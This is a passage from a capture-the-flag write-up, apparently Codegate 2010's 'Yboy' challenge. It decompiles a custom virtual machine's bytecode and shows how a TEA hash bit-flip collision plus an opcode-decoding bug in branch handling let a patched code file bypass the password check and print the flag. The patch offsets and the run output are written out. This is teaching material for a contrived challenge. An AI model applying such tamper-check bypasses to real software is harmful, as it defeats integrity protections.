0111:   r30 = xor r30, r30
0112:   r1 = load r30, r0
0113:   r0 = outputchar r1, r0
0114:   r30 = add r29, r30
0115:   r31 = set_imm 0, 26     ; &amp;
0116:   r31 = sub r30, r31
0117:   r32 = set_imm 1, 12     ; 0112
0118:   r0 = branch r31, r32    ; if (r31) goto r32
0119:   r1 = set_imm 0, a       ;
011a:   r0 = outputchar r1, r0
011b:   r0 = halt r0, r0
</pre>

<p>Pseudo C code of the decompiled <em>codefile</em></p>

<pre class="brush: cpp; title: ; notranslate" title="">// data is an int array - int data[0x2000/4]
// the first 140 bytes of data store the content of "secret.key" file
printf("Enter password&gt;&gt;");
r4 = 1337;
while (!EOF) {
        r3 = getc();
        data[r4] = r3;
        if (r3 == 'n') break;
        r4++;
}
r19 = 1337;
r20 = 0;
while (1) {
        if (r20 == 0x23) goto correctpass;
        if (data[r20] != data[r19+r20]) goto wrongpass;
        r20++;
}

wrongpass:
printf("Access Deniedn");
exit(0);

correctpass:
printf("Greetz hackers. Keep up the good work. Stay sharp. Disobey misinformation.n");
printf("Your flag is: ");
for(i=0; i&lt;0x26; i++)
        print("%c", data[i]);
printf("n");
</pre>

<h3 id="c-xbox8217s-tea-hash-collision">c. Xbox’s TEA hash collision</h3>

<p>From the decompiled VM code above, if we could modify the content of <em>codefile</em>, it would be possible to print out the flag inside secret.key stored at <em>data[0]</em>. However, the <em>codefile</em> is protected from being tampered with a hash algorithm.</p>

<pre class="brush: cpp; title: ; notranslate" title="">int
check_code()
{
        int result;
        unsigned int v1;
        unsigned int v2;
        unsigned int i;

        hash_block(0x99999999, 0xBBBBBBBB, 0x44444444, 0x55555555, code[0],
            code[1], &amp;v2, &amp;v1);

        for (i = 2; i &lt;= 32766; i += 2)
                hash_block(v2, v1, v2, v1, code[i], code[i + 1], (int *) &amp;v2,
                    (int *) &amp;v1);

        if (v2 != 0x1EC0A9F0 || (result = v1, v1 != 0x9217F034)) {
                puts("Tampering detected. Prepare for imminent arrest.");
                exit(0);
        }
        return result;
}
</pre>

<p>Google the constant <strong>0x61C88647</strong> and searching around, I found that it’s a TEA based hash algorithm. Using TEA hash is bad and there is a weakness in the algorithm in which by flipping the 32nd and 64th bit of a 64 bits block, the hash value will remain the same. <a href="http://www.xbox-linux.org/wiki/17_Mistakes_Microsoft_Made_in_the_Xbox_Security_System#The_TEA_Hash" target="_blank">Xbox was hacked</a> because of this one. (<em>Actually I didn’t know about Xbox’s TEA bits flipping attack. I found this collision by writing a tool doing the brute force on bits flipping of 64 bits block to find the collision. Later, I realized that Yboy is Xbox with two bits flipped</em>)</p>

<p>Now, the next problem is to find how <em>codefile</em> should be patched to print out the flag.</p>

<h3 id="d-branch-instruction-handing-bug">d. Branch instruction handing bug</h3>

<p>The 32nd and 64th bit of a 64 bits block are MSB bits of the opcode field of two consequence instructions. Since the code only uses the least 05 bits in opcode for instruction decode, changing the MSB of the opcode won’t affect the instruction decode part. However, there is a problem with branch instruction handling code which will help us to modify the behavior of branch.</p>

<p>If we look at the VM parsing code, an instruction (4 byes) structure is as the following</p>

<p>[ opcode ] [ output register ] [ imm1 ] [ imm2 ]</p>

<pre class="brush: cpp; title: ; notranslate" title="">opcode = (ins &gt;&gt; 24);   //&amp; 0x1f;
                reg = (ins &gt;&gt; 16) &amp; 0xFF;
                imm1 = (ins &gt;&gt; 8) &amp; 0xFF;
                imm2 = (unsigned char) ins;
</pre>

<p>The least 05 bits of opcode are being used as an index to lookup for the corresponding function from the <em>decode</em> function table (<em>decode[opcode &amp; 0x1f]</em>)</p>

<p>Lets look deeper at the code handling ‘branch’ instruction:</p>

<pre class="brush: cpp; title: ; notranslate" title="">int branch(int imm1, int imm2)
{
        if (imm1)
                PC = imm2;
        else
                PC++;
        return 0;
}
</pre>

<p><strong>Inside main()</strong></p>

<p><strong><a href="http://www.vnsecurity.net/wp/storage/uploads/2010/03/codegatechal2.png"><img class="alignnone size-full wp-image-650" title="codegatechal2" src="http://www.vnsecurity.net/wp/storage/uploads/2010/03/codegatechal2.png" alt="codegatechal2" width="500" height="365" /></a></strong></p>

<p>As we can see, it only uses the least five bits of opcode* ((ins » 24) &amp; 0x1f)* for decode while the full byte *(ins » 24) *is used for comparing later (opcode value for branch is <strong>oxC</strong>).</p>

<p>If we set the MSB of opcode, the opcode would become 0x8c. In this case, the <em>branch() *function is still being called, however, the *(opcode == 0xC)</em> check in <em>main</em>() will be false and <strong>PC will be increased by 1 unexpectedly</strong>.</p>

<h3 id="e-subvert-the-code-flow-to-print-out-the-flag">e. Subvert the code flow to print out the flag</h3>

<p>Look back at the decompiled VM code</p>

<pre class="brush: cpp; title: ; notranslate" title="">0020:   r60 = set_imm 0, ff     ; r60 = 255
0021:   r61 = set_imm 0, 1      ; r61 = 1
0022:   r4 = set_imm 5, 39      ; r4 = 0x539  (1337)
0023:   r3 = inputchar r0, r0   ; r3 = getc()
0024:   r50 = set_imm 0, a      ; r50 = 'n'
0025:   r0 = store r4, r3          ; data[r4] = r3
0026:   r0 = nop r0, r0
0027:   r10 = sub r3, r50        ; r10 = r3 - 'n'
0028:   r10 = not r10, r0         ; !r10
0029:   r11 = set_imm 0, 2f     ; r11 = 0x002f
002a:   r0 = branch r10, r11    ; if (r3 == 'n') goto 002f
002b:   r4 = add r61, r4           ; r4++
002c:   r10 = sub r60, r3         ; r10 = 255 - r3
002d:   r11 = set_imm 0, 23    ; 0x0023
002e:   r0 = branch r10, r11    ; if (r3 != EOF) goto 0023
002f:   r19 = set_imm 5, 39     ; r19 = 0x539 (1337)
0030:   r20 = set_imm 0, 0      ; r20 = 0
0031:   r21 = set_imm 0, 23    ; r21 = 0x23 (35)
0032:   r21 = sub r21, r20      ; r21 = r21 - r20
0033:   r21 = not r21, r0        ; !r21
0034:   r22 = set_imm 0, 5e     ; 0x005e
0035:   r0 = branch r21, r22    ; if (r20 == 35) goto 005e //goodpassword
0036:   r21 = load r20, r0        ; r21 = data[r20]
0037:   r25 = add r19, r20       ; r25 = 0x539 + r20
0038:   r0 = nop r0, r0
0039:   r26 = load r25, r0        ; r26 = data[0x539 + r20]
003a:   r26 = sub r21, r26        ; r26 = r26 - r21
003b:   r22 = set_imm 0, 41     ; 0x0041
003c:   r0 = branch r26, r22    ; if (data[r20] != data[0x539+r20) goto 0041 //badpassword
003d:   r23 = set_imm 0, 1      ; r23 = 1
003e:   r20 = add r20, r23       ; r20++
003f:   r22 = set_imm 0, 31     ; 0x0032
0040:   r0 = branch r22, r22    ; goto 0032 //loop
</pre>

<p>The code above read password from stdin, stores it inside <em>data</em> array starting at <em>data[0x539] *then compares the input with the content of *secret.key</em> stored at the beginning of <em>data[0]</em> (35 DWORDS = 140 bytes).</p>

<p><em>What if we modify the MSB bit of branch instruction at 002a?</em></p>

<blockquote>
  <p>//modify <em>code[2a]</em> from 0x0c000a0b to 0x8c000a0b<br />
002a: r0 = branch r10, r11 ; if (r3 == ‘n’) goto 002f</p>
</blockquote>

<p>When ‘n’ is read, the branch() instruction will set PC to the password check code at 002f (<em>002f: r19 = set_imm 5, 39 ; r19 = 0x539</em>). However, because the opcode now is 0x8c instead of 0x0c, PC will be also increased by 1 unexpectedly due to the bug at main loop code mentioned above. Hence, the PC will point to instruction at 0030 (0<em>030: r20 = set_imm 0, 0 ; r20 = 0</em>) instead of 002f.</p>

<p>Since the instruction at 002f is skipped, r19 register will be 0 (default value) instead of 0x539. The VM code becomes</p>

<pre class="brush: cpp; title: ; notranslate" title="">//r19 register value is 0 while it's expected to be 0x539
r20 = 0;
while (1) {
        if (r20 == 0x23) goto correctpass;
        if (data[r20] != data[r19+r20]) goto wrongpass;
        r20++;
}
</pre>

<p>It’s comparing identical data. Yboy Pwned!</p>

<h2 id="exploit">Exploit</h2>

<ul>
  <li>Copy the <em>codefile</em>, edit it to set the 32nd and 64th bits at offset 0x2a</li>
</ul>

<blockquote>
  <p>code[2a] 0x0c000a0b -&gt; 0x8c000a0b<br />
code[2b] 0x03043d04 -&gt; 0x83043d04</p>
</blockquote>

<ul>
  <li>Run the yboy with the new codefile</li>
  <li>Press enter and get the flag</li>
</ul>

<blockquote>
  <p>hugh@codegate-desktop:/tmp/rd$ ./yboy newcodefile<br />
…<br />
Enter password»<br />
Greetz hackers. Keep up the good work. Stay sharp. Disobey misinformation.<br />
Your flag is: TEA - Toiletpaper Esque Aspirations</p>
</blockquote>

<h2 id="references">References</h2>

<ul>
  <li><a href="http://www.xbox-linux.org/wiki/17_Mistakes_Microsoft_Made_in_the_Xbox_Security_System#The_TEA_Hash" target="_blank">17 Mistakes Microsoft Made in the Xbox Security System</a></li>
</ul>

<p>Keywords: TEA, VM, Xbox, codegate 2010</p>


  ]]></description>
</item>

</channel>
</rss>